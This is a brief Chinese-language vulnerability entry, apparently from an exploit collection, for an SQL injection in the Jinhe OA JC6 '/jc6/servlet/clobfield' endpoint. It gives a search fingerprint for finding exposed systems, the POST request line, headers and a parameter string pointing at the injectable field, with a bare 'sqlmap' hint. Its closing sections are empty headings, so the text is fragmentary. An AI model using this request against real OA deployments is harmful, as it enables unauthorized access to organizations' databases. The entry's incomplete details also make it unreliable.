# 金和OAJC6clobfield存在sql注入

- **系统**：金和OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`web.body="JC6金和协同管理平台"`
- **请求**：`POST /jc6/servlet/clobfield HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Length: 158`　`Content-Type: application/x-www-form-urlencoded`　`SL-CE-SUID: 77`

**请求体 / payload**
```
key=readClob&sImgname=filename&sTablename=FC_ATTACH&sKeyname=djbh&sKeyvalue=1
sqlmap\
```

**其他**
- 金和OA JC6 clobfield 存在sql注入: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞简介
***
- 版本: * 金和OA